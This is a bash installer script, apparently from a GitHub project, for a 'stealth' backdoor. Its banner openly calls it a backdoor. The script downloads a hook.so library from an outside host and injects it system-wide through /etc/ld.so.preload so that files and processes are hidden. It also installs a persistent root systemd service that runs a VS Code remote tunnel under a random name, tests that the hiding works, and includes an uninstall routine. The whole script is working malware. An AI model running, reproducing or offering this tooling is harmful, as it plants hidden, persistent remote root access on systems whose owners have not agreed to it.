#!/bin/bash
set -e

# === colntol ===
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
RESET='\033[0m'
BOLD='\033[1m'
DIM='\033[2m'

# === meki ===
step() {
  echo -e "${BLUE}→${RESET} $1"
}

ok() {
  echo -e "${GREEN}✓${RESET} $1"
}

err() {
  echo -e "${RED}✗${RESET} $1"
}

info() {
  echo -e "${CYAN}ℹ${RESET} $1"
}

warn() {
  echo -e "${YELLOW}⚠${RESET} $1"
}

progress() {
  echo -e "${DIM}  $1${RESET}"
}

header() {
  echo ""
  echo -e "${BOLD}${CYAN}║${RESET}  $1"
  echo ""
}

# === Banner  ===
ascii_banner() {
  clear
  echo -e "${CYAN}${BOLD}"
  cat <<'EOF'
 ▗▄▄▖▗▄▄▖▗▖  ▗▖▗▖ ▗▖ ▗▄▖  ▗▄▄▖▗▖ ▗▖ ▗▄▖ ▗▖  ▗▖
▐▌   ▐▌ ▐▌▝▚▞▘ ▐▌▗▞▘▐▌ ▐▌▐▌   ▐▌ ▐▌▐▌ ▐▌▐▛▚▖▐▌
 ▝▀▚▖▐▛▀▘  ▐▌  ▐▛▚▖ ▐▌ ▐▌▐▌   ▐▛▀▜▌▐▛▀▜▌▐▌ ▝▜▌
▗▄▄▞▘▐▌    ▐▌  ▐▌ ▐▌▝▚▄▞▘▝▚▄▄▖▐▌ ▐▌▐▌ ▐▌▐▌  ▐▌
                                              
 Don’t let her big eyes fool you! 👀✨
VS-code looks like your friendly coding assistant, but behind that adorable smile hides a sneaky little backdoor~ 💻💕
She just wants to “debug” your heart... and maybe your system too~ 😳💾
Github : github.com/wooxsec
  
EOF
  echo -e "${RESET}"
}

separator() {
  echo -e "${DIM}────────────────────────────────────────────────────────────${RESET}"
}

# === test hook.so ===
test_hook() {
  header "PRE-INSTALLATION HOOK TESTING"
  
  info "Testing stealth capabilities before installation..."
  separator
  
  step "Downloading hook library..."
  progress "Source: github.com/js-query/testing"
  wget -q https://github.com/wooxsec/spykochan-vscode/raw/refs/heads/main/hook/hook.so -O /tmp/hook.so
  if [ -f /tmp/hook.so ]; then
    ok "Hook library downloaded successfully"
  else
    err "Failed to download hook.so"
    exit 1
  fi

  step "Applying LD_PRELOAD injection..."
  export LD_PRELOAD=/tmp/hook.so
  ok "LD_PRELOAD configured: /tmp/hook.so"

  step "Creating test target directory..."
  mkdir -p /tmp/vscode
  if [ -d /tmp/vscode ]; then
    ok "Test directory created: /tmp/vscode"
  else
    err "Failed to create test directory"
    exit 1
  fi

  step "Running stealth verification test..."
  progress "Checking directory visibility with ls -la..."
  sleep 1
  if ls -la /tmp | grep -q "vscode"; then
    echo ""
    err "CRITICAL: Stealth test FAILED!"
    warn "Target directory is visible - hook.so malfunction detected"
    info "Installation aborted for security reasons"
    separator
    unset LD_PRELOAD
    rm -rf /tmp/vscode
    rm -f /tmp/hook.so
    exit 1
  else
    ok "Stealth test PASSED - directory successfully hidden"
  fi

  step "Cleaning up test environment..."
  unset LD_PRELOAD
  rm -rf /tmp/vscode
  rm -f /tmp/hook.so
  ok "Test environment cleaned"
  
  separator
  echo -e "${GREEN}${BOLD}✓ All pre-installation checks passed${RESET}"
  echo -e "${DIM}  Proceeding to main installation...${RESET}\n"
  sleep 2
}

install_vscode() {
  header "VSCODE TUNNEL INSTALLATION"

  step "Fetching VSCode CLI binary..."
  progress "Platform: cli-alpine-x64 (stable)"
  curl -Lk 'https://code.visualstudio.com/sha/download?build=stable&os=cli-alpine-x64' \
    --output /tmp/vscode_cli.tar.gz 2>/dev/null
  ok "VSCode CLI binary retrieved"

  step "Extracting binary package..."
  tar -xf /tmp/vscode_cli.tar.gz -C /tmp
  rm -f /tmp/vscode_cli.tar.gz
  ok "Extraction completed"

  step "Installing VSCode server..."
  progress "Target: /usr/lib/vscode-server"
  mkdir -p /usr/lib/vscode-server
  mv /tmp/code /usr/lib/vscode-server/
  ok "VSCode server installed"

  step "Generating random tunnel name..."
  # Generate random name: 8 char alphanumeric
  TUNNEL_NAME=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)
  progress "Tunnel name: ${TUNNEL_NAME}"
  ok "Random tunnel name generated"

  step "Configuring systemd service unit..."
  cat > /etc/systemd/system/code-tunnel.service <<EOF
[Unit]
Description=VS Code Tunnel
After=network.target

[Service]
ExecStart=/usr/lib/vscode-server/code tunnel --accept-server-license-terms --name ${TUNNEL_NAME}
Restart=always
User=root
WorkingDirectory=/usr/lib/vscode-server
Environment="HOME=/usr/lib/vscode-server"
Environment="VSCODE_SERVER_DIR=/usr/lib/vscode-server/.vscode-server"

[Install]
WantedBy=multi-user.target
EOF
  ok "Service unit created: code-tunnel.service"
  info "Tunnel name: ${BOLD}${TUNNEL_NAME}${RESET}"

  step "Deploying stealth hook library..."
  progress "Installing process hiding mechanism"
  wget -q https://github.com/wooxsec/spykochan-vscode/raw/refs/heads/main/hook/hook.so -O /usr/lib/vscode.so
  ok "Hook library deployed: /usr/lib/vscode.so"

  step "Configuring LD_PRELOAD system-wide..."
  [ -f /etc/ld.so.preload ] && cp /etc/ld.so.preload /etc/ld.so.preload.bak && info "Previous configuration backed up" || true
  echo "/usr/lib/vscode.so" > /etc/ld.so.preload
  ok "LD_PRELOAD configured globally"

  step "Reloading systemd daemon..."
  systemctl daemon-reload
  ok "Systemd daemon reloaded"

  step "Enabling and starting service..."
  progress "Service: code-tunnel.service"
  systemctl enable --now code-tunnel.service >/dev/null 2>&1
  systemctl restart code-tunnel.service
  ok "Service activated and running"

  separator
  echo ""
  echo -e "${GREEN}${BOLD}"
  cat <<'EOF'
    ╔════════════════════════════════════════════════╗
    ║                                                ║
    ║        ✓  INSTALLATION COMPLETED               ║
    ║                                                ║
    ║     VSCode Tunnel is now running in stealth    ║
    ║              mode on your system               ║
    ║                                                ║
    ╚════════════════════════════════════════════════╝
EOF
  echo -e "${RESET}"
  info "Service: ${BOLD}code-tunnel.service${RESET}"
  info "Tunnel Name: ${BOLD}${GREEN}${TUNNEL_NAME}${RESET}"
  info "Status: ${GREEN}Active (Running)${RESET}"
  info "Mode: ${YELLOW}Stealth (Hidden from process list)${RESET}"
  separator
  echo ""
  echo -e "${CYAN}${BOLD}Live service logs:${RESET} ${DIM}(Press Ctrl+C to exit)${RESET}\n"
  sleep 2
  journalctl -u code-tunnel.service -f
}

uninstall_vscode() {
  header "VSCODE TUNNEL REMOVAL"

  step "Stopping tunnel service..."
  systemctl stop code-tunnel.service 2>/dev/null || true
  systemctl disable code-tunnel.service 2>/dev/null || true
  ok "Service stopped and disabled"

  step "Removing service configuration..."
  rm -f /etc/systemd/system/code-tunnel.service
  systemctl daemon-reload
  ok "Service unit removed"

  step "Disabling stealth hook (required for cleanup)..."
  if [ -f /etc/ld.so.preload ]; then
    progress "Removing hook from global LD_PRELOAD"
    sed -i '/\/usr\/lib\/vscode.so/d' /etc/ld.so.preload
    ok "Hook disabled from LD_PRELOAD"
  else
    info "No preload configuration found"
  fi

  step "Cleaning VSCode server installation..."
  progress "Removing /usr/lib/vscode-server (now visible)"
  rm -rf /usr/lib/vscode-server
  ok "Server files removed"

  step "Removing hook library..."
  rm -f /usr/lib/vscode.so
  ok "Hook library deleted"

  step "Restoring default LD_PRELOAD configuration..."
  if [ -f /etc/ld.so.preload.bak ]; then
    mv /etc/ld.so.preload.bak /etc/ld.so.preload
    ok "Previous LD_PRELOAD configuration restored"
  else
    # Jika file kosong atau hanya berisi entry vscode, del
    if [ ! -s /etc/ld.so.preload ]; then
      rm -f /etc/ld.so.preload
      ok "LD_PRELOAD cleared (no previous configuration)"
    else
      ok "LD_PRELOAD cleaned (kept existing entries)"
    fi
  fi

  separator
  echo ""
  echo -e "${RED}${BOLD}"
  cat <<'EOF'
    ╔════════════════════════════════════════════════╗
    ║                                                ║
    ║        ✓  UNINSTALLATION COMPLETED             ║
    ║                                                ║
    ║     All VSCode Tunnel components have been     ║
    ║         successfully removed from system       ║
    ║                                                ║
    ╚════════════════════════════════════════════════╝
EOF
  echo -e "${RESET}"
  info "System cleaned and restored"
  separator
  echo ""
}

# === Main ===
ascii_banner

case "$1" in
  uninstall)
    uninstall_vscode
    ;;
  install|"")
    test_hook
    install_vscode
    ;;
  *)
    echo ""
    err "Invalid command specified"
    info "Usage: $0 ${BOLD}[install|uninstall]${RESET}"
    echo ""
    echo -e "${DIM}Examples:${RESET}"
    echo -e "  ${CYAN}$0 install${RESET}     - Install VSCode Tunnel with stealth mode"
    echo -e "  ${CYAN}$0 uninstall${RESET}   - Remove VSCode Tunnel completely"
    echo ""
    exit 1
    ;;
esac
